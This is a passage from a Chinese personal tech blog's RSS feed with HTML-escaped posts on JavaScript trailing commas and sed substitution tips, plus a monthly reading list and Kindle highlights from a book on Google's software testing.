      <description>&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
&lt;p&gt;看下面的代码，如果我们要新增加一行&amp;quot;ccc&amp;quot;, 实际我们的目的是增加一行，但是对于像git这种版本控制系统来说，我们改动了两行。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第三行进行了修改&lt;/li&gt;
&lt;li&gt;第四行增加了&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们为什么要改动两行呢？因为如果不在第三行上的末尾加上逗号就增加第四行，则会报错语法错误。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;names&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aaa&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bbb&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;names&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aaa&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bbb&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ccc&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;尾逗号的提案就是允许再一些场景下，允许再尾部增加逗号。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aaa&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bbb&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那么我们再新增加一行的情况下，则只需要增加一行，而不需要修改之前行的代码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aaa&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bbb&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ccc&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;兼容性&#34;&gt;兼容性&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;除了IE浏览器没有对尾逗号全面支持以外，其他浏览器以及Node环境都已经全满支持&lt;/li&gt;
&lt;li&gt;JSON是不支持尾逗号的，尾逗号只能在代码里面用&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;注意在包含尾逗号时数组长度的计算&#34;&gt;注意在包含尾逗号时数组长度的计算&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[,,,].&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 3
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;[,,,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 4
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;[,,,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,].&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 4
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,,,].&lt;span style=&#34;color:#a6e22e&#34;&gt;lenght&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 3
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;使用场景&#34;&gt;使用场景&lt;/h1&gt;
&lt;h2 id=&#34;数组中使用&#34;&gt;数组中使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;abc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;对象字面量中使用&#34;&gt;对象字面量中使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;li&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;作为形参使用&#34;&gt;作为形参使用&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;say&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;作为实参使用&#34;&gt;作为实参使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;say&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;li&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;在import中使用&#34;&gt;在import中使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  } &lt;span style=&#34;color:#a6e22e&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;D&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Trailing_commas&#34;&gt;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Trailing_commas&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>7月书单</title>
      <link>https://wdd.js.org/posts/2021/07/ou9o92/</link>
      <pubDate>Thu, 08 Jul 2021 12:34:59 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/07/ou9o92/</guid>
      <description>&lt;h1 id=&#34;6月书单回顾&#34;&gt;6月书单回顾&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;《鳗鱼的旅行》刚读到92%&lt;/li&gt;
&lt;li&gt;《Googler软件测试之道》100%&lt;/li&gt;
&lt;li&gt;《软件测试之道微软技术专家经验总结》24%&lt;/li&gt;
&lt;li&gt;《沉默的病人》100%&lt;/li&gt;
&lt;li&gt;《一个人的朝圣》9%&lt;/li&gt;
&lt;li&gt;《读懂发票》100%&lt;/li&gt;
&lt;li&gt;《108个训练让你成为手机摄影达人》100%&lt;/li&gt;
&lt;li&gt;《经济学通识课》5%&lt;/li&gt;
&lt;li&gt;《楚留香新传》100%&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;7月书单&#34;&gt;7月书单&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;《鳗鱼的旅行》&lt;/li&gt;
&lt;li&gt;《软件测试之道微软技术专家经验总结》&lt;/li&gt;
&lt;li&gt;[KU]《一个人的朝圣》&lt;/li&gt;
&lt;li&gt;[KU]《经济学通识课》&lt;/li&gt;
&lt;li&gt;new 水浒传&lt;/li&gt;
&lt;li&gt;[KU] new 围城&lt;/li&gt;
&lt;li&gt;[KU] new 黄金时代&lt;/li&gt;
&lt;li&gt;new 长安十二时辰&lt;/li&gt;
&lt;li&gt;[KU] new 幻夜&lt;/li&gt;
&lt;li&gt;new 软件开发本质论&lt;/li&gt;
&lt;li&gt;[KU] new 苏东坡传&lt;/li&gt;
&lt;li&gt;[KU] new 诡计博物馆&lt;/li&gt;
&lt;li&gt;[KU] new 大师的盛宴 二十世纪最佳科幻小说&lt;/li&gt;
&lt;li&gt;[KU] new 活出生命的意义&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>sed替换</title>
      <link>https://wdd.js.org/shell/sed-tips/</link>
      <pubDate>Thu, 08 Jul 2021 09:17:30 +0800</pubDate>
      <guid>https://wdd.js.org/shell/sed-tips/</guid>
      <description>&lt;h1 id=&#34;直接在原文的基础上修改&#34;&gt;直接在原文的基础上修改&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/ABC/abc/g&amp;#39;&lt;/span&gt; some.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;多次替换&#34;&gt;多次替换&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;方案 1 使用分号&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sed &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39;&lt;/span&gt; some.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;方案 2 多次使用-e&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sed -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/ABC/abc/g&amp;#39;&lt;/span&gt; -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/DEF/def/g&amp;#39;&lt;/span&gt; some.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;转译&#34;&gt;转译/&lt;/h1&gt;
&lt;p&gt;如果替换或者被替换的字符中本来就有&lt;code&gt;/&lt;/code&gt;, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the &lt;em&gt;regexp&lt;/em&gt; or &lt;em&gt;replacement&lt;/em&gt; only if it is preceded by a \ character.
&lt;!-- raw HTML omitted --&gt;&lt;a href=&#34;https://www.gnu.org/software/sed/manual/sed.html&#34;&gt;https://www.gnu.org/software/sed/manual/sed.html&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Google软件测试之道（异步图书） James Whittaker; Jason Arbon; Jeff Carollo</title>
      <link>https://wdd.js.org/posts/2021/07/yh8ulq/</link>
      <pubDate>Thu, 08 Jul 2021 09:03:07 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/07/yh8ulq/</guid>
      <description>&lt;p&gt;Google软件测试之道（异步图书）&lt;!-- raw HTML omitted --&gt;James Whittaker; Jason Arbon; Jeff Carollo&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;序&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 361&lt;!-- raw HTML omitted --&gt;从根本上说，如果测试人员想加入这个俱乐部，就必须具备良好的计算机科学基础和编程能力。变革&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 367&lt;!-- raw HTML omitted --&gt;招聘具备开发能力的测试人员很难，找到懂测试的开发人员就更难，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 368&lt;!-- raw HTML omitted --&gt;但是维持现状更要命，我只能往前走。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 388&lt;!-- raw HTML omitted --&gt;我们寻找的人要兼具开发人员的技能和测试人员的思维，他们必须会编程，能实现工具、平台和测试自动化。&lt;!-- raw HTML omitted --&gt;第1章 Google软件测试介绍&lt;!-- raw HTML omitted --&gt;标注(黄色) - 1.1 质量不等于测试 &amp;gt; 位置 573&lt;!-- raw HTML omitted --&gt;Google能用如此少的专职测试人员的原因，就是开发对质量的负责。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 1.1 质量不等于测试 &amp;gt; 位置 574&lt;!-- raw HTML omitted --&gt;如果某个产品出了问题，第一个跳出来的肯定是导致这个问题发生的开发人员，而不是遗漏这个 bug的测试人员。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 1.2.1 软件开发工程师（SWE） &amp;gt; 位置 593&lt;!-- raw HTML omitted --&gt;软件开发工程师（&lt;!-- raw HTML omitted --&gt;标注(黄色) - 1.2.2 软件测试开发工程师（SET） &amp;gt; 位置 600&lt;!-- raw HTML omitted --&gt;软件测试开发工程师（&lt;!-- raw HTML omitted --&gt;标注(黄色) - 1.2.3 测试工程师（TE） &amp;gt; 位置 612&lt;!-- raw HTML omitted --&gt;TE把用户放在第一位来思考。 TE组织整体质量实践，分析解释测试运行结果，&lt;!-- raw HTML omitted --&gt;第2章 软件测试开发工程师&lt;!-- raw HTML omitted --&gt;书签 - 位置 784&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 787&lt;!-- raw HTML omitted --&gt;Google的 SWE是功能开发人员； Google的 SET是测试开发人员； Google的 TE是用户开发人员。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.1.1 开发和测试流程 &amp;gt; 位置 864&lt;!-- raw HTML omitted --&gt;测试驱动开发”&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.1.3 项目的早期阶段 &amp;gt; 位置 908&lt;!-- raw HTML omitted --&gt;一个产品如果在概念上还没有完全确定成型时就去关心质量，这就是优先级混乱的表现。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.1.14 测试运行要求 &amp;gt; 位置 1398&lt;!-- raw HTML omitted --&gt;每个测试和其他测试之间都是独立的，使它们就能够以任意顺序来执行。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.1.14 测试运行要求 &amp;gt; 位置 1399&lt;!-- raw HTML omitted --&gt;测试不做任何数据持久化方面的工作。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.1.14 测试运行要求 &amp;gt; 位置 1400&lt;!-- raw HTML omitted --&gt;在这些测试用例离开测试环境的时候，要保证测试环境的状态与测试用例开始执行之前的状态是一样的。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.1.14 测试运行要求 &amp;gt; 位置 1404&lt;!-- raw HTML omitted --&gt;总之，“任意顺序”意味着可以并发执行用例。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.3 SET的招聘 &amp;gt; 位置 1650&lt;!-- raw HTML omitted --&gt;在一些棘手的编码问题或功能的正确性上浪费时间，不如考核他们是如何看待编码和质量的。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.3 SET的招聘 &amp;gt; 位置 1727&lt;!-- raw HTML omitted --&gt;测试不应是被要求了才去做的事情。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.3 SET的招聘 &amp;gt; 位置 1728&lt;!-- raw HTML omitted --&gt;程序的稳定性和韧性比功能正确要重要的多。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.4 与工具开发工程师Ted Mao的访谈 &amp;gt; 位置 1796&lt;!-- raw HTML omitted --&gt;要允许他们使用你无法预料的方式来使用你的工具。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.5 与Web Driver的创建者Simon Stewart的对话 &amp;gt; 位置 1845&lt;!-- raw HTML omitted --&gt;我使用了一个被称为 DDD（译注： defect-driven development）的流程，缺陷驱动开发。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 2.5 与Web Driver的创建者Simon Stewart的对话 &amp;gt; 位置 1859&lt;!-- raw HTML omitted --&gt;Chrome在使用 PyAuto，&lt;!-- raw HTML omitted --&gt;第3章 测试工程师&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.1 一种面向用户的测试角色 &amp;gt; 位置 1879&lt;!-- raw HTML omitted --&gt;我们说 TE是一种“用户开发者（ user-developer）”，这不是一个容易理解的概念。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.1 一种面向用户的测试角色 &amp;gt; 位置 1880&lt;!-- raw HTML omitted --&gt;对于编码的敬意是公司文化中相当重要的一点。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1903&lt;!-- raw HTML omitted --&gt;在研发的早期阶段，功能还在不断变化，最终功能列表和范畴还没有确定， TE通常没有太多的工作可做。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1904&lt;!-- raw HTML omitted --&gt;给一个项目配备多少测试人员，取决于项目风险和投资回报率。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1906&lt;!-- raw HTML omitted --&gt;我们需要在正确的时间，投入正确数量的 TE，并带来足够的价值。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1908&lt;!-- raw HTML omitted --&gt;当前软件的薄弱点在哪里？&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1909&lt;!-- raw HTML omitted --&gt;有没有安全、隐私、性能、可靠性、可用性、&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1910&lt;!-- raw HTML omitted --&gt;主要用户场景是否功能正常？&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1911&lt;!-- raw HTML omitted --&gt;当发生问题的时候，是否容易诊断问题所在？&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1914&lt;!-- raw HTML omitted --&gt;TE的根本使命是保护用户和业务的利益，使之不受到糟糕的设计、令人困惑的用户体验、&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1921&lt;!-- raw HTML omitted --&gt;TE擅长发现需求中的模糊之处，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1924&lt;!-- raw HTML omitted --&gt;TE通常是团队里最出名的人，因为他们需要与各种角色&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2 测试工程师的工作 &amp;gt; 位置 1938&lt;!-- raw HTML omitted --&gt;下面是我们关于 TE职责的一般性描述。测试计划和风险分析。评审需求、设计、代码和测试。探索式测试。用户场景。编写测试用例。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 1949&lt;!-- raw HTML omitted --&gt;如果软件深受人们喜爱，大家就会认为测试所作所为是理所应当的；如果软件很糟糕，人们可能就会质疑测试工作。&lt;!-- raw HTML omitted --&gt;笔记 - 3.2.1 测试计划 &amp;gt; 位置 1950&lt;!-- raw HTML omitted --&gt;测试背锅&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 1990&lt;!-- raw HTML omitted --&gt;读者可以用“ Google Test Analytics”关键词搜索到这个工具。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 3.2.1 测试计划 &amp;gt; 位置 1991&lt;!-- raw HTML omitted 